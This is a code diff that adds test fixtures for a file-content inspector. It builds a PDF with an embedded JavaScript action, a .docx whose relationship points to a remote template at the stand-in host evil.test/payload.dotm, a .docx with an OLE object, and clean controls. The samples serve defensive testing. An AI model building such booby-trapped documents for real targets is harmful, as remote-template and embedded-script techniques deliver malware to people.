@@ -2,7 +2,7 @@ import { pathToFileURL as __pathToFileURL } from "node:url";
 "use strict";
 
 import { randomBytes } from "node:crypto";
-import { deflateRawSync, gzipSync } from "node:zlib";
+import { deflateRawSync, deflateSync, gzipSync } from "node:zlib";
 import {
   inspectUntrustedContent,
   inspectUntrustedContentFallback,
@@ -162,6 +162,39 @@ function sevenZipArchive(nextHeader: Buffer): Buffer {
   start.writeBigUInt64LE(BigInt(nextHeader.length), 20);
   return Buffer.concat([start, nextHeader]);
 }
+
+function pdfWithCompressedStream(payload: string): Buffer {
+  const compressed = deflateSync(Buffer.from(payload, "latin1"));
+  const head = "%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 3 0 R >>\nendobj\n2 0 obj\n<< /Length "
+    + String(compressed.length)
+    + " /Filter /FlateDecode >>\nstream\n";
+  const tail = "\nendstream\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n";
+  return Buffer.concat([Buffer.from(head, "latin1"), compressed, Buffer.from(tail, "latin1")]);
+}
+
+const RELS_EXTERNAL_TEMPLATE = Buffer.from(
+  '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
+  + '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://evil.test/payload.dotm" TargetMode="External"/>'
+  + "</Relationships>",
+  "utf8"
+);
+
+const RELS_OLE_OBJECT = Buffer.from(
+  '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
+  + '<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="embeddings/oleObject1.bin"/>'
+  + "</Relationships>",
+  "utf8"
+);
+
+const RELS_INTERNAL_ONLY = Buffer.from(
+  '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
+  + '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/>'
+  + '<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.xml"/>'
+  + "</Relationships>",
+  "utf8"
+);
+
+const OOXML_BODY = Buffer.from('<?xml version="1.0"?><w:document><w:body><w:p><w:r><w:t>raport</w:t></w:r></w:p></w:body></w:document>', "utf8");
 
 const PE_STUB = Buffer.concat([Buffer.from([0x4d, 0x5a, 0x90, 0x00]), Buffer.alloc(2048, 0x41)]);
 const ELF_STUB = Buffer.concat([Buffer.from([0x7f]), Buffer.from("ELF", "ascii"), Buffer.alloc(2048, 0x42)]);
@@ -336,6 +369,51 @@ export function buildInspectionFixtures(): InspectionFixture[] {
       filename: "raport.doc",
       mime: "application/msword",
       mode: "document"
+    },
+    {
+      name: "pdf-javascript-in-flux-comprimat",
+      bytes: pdfWithCompressedStream("<< /Type /Action /S /JavaScript /JS (app.alert\(1\)) >>"),
+      filename: "raport-comprimat.pdf",
+      mime: "application/pdf",
+      mode: "document"
+    },
+    {
+      name: "pdf-flux-comprimat-curat",
+      bytes: pdfWithCompressedStream("BT /F1 12 Tf (raport trimestrial fara actiuni) Tj ET"),
+      filename: "raport-curat.pdf",
+      mime: "application/pdf",
+      mode: "document"
+    },
+    {
+      name: "ooxml-sablon-extern",
+      bytes: zipArchive([
+        { name: "[Content_Types].xml", data: Buffer.from("<Types/>", "utf8") },
+        { name: "word/_rels/settings.xml.rels", data: RELS_EXTERNAL_TEMPLATE },
+        { name: "word/document.xml", data: OOXML_BODY }
+      ]),
+      filename: "sablon.docx",
+      mime: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
+      mode: "archive"
+    },
+    {
+      name: "ooxml-obiect-ole",
+      bytes: zipArchive([
+        { name: "word/_rels/document.xml.rels", data: RELS_OLE_OBJECT },
+        { name: "word/document.xml", data: OOXML_BODY }
+      ]),
+      filename: "ole.docx",
+      mime: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
+      mode: "archive"
+    },
+    {
+      name: "ooxml-relatii-interne",
+      bytes: zipArchive([
+        { name: "word/_rels/document.xml.rels", data: RELS_INTERNAL_ONLY },
+        { name: "word/document.xml", data: OOXML_BODY }
+      ]),
+      filename: "curat.docx",
+      mime: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
+      mode: "archive"
     },
     {
       name: "document-curat",
